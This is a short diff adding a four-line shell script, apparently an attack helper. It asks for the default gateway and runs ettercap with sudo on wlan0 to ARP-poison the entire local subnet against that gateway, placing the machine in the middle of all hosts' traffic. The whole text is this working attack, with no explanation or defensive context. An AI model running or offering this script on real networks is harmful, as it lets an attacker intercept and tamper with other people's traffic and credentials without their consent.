@@ -1,0 +1,4 @@
+echo Poisoning Subnet
+echo -n "Default Gateway: "
+read gateway
+sudo ettercap -i wlan0 -T -M arp:remote ///$gateway// ///
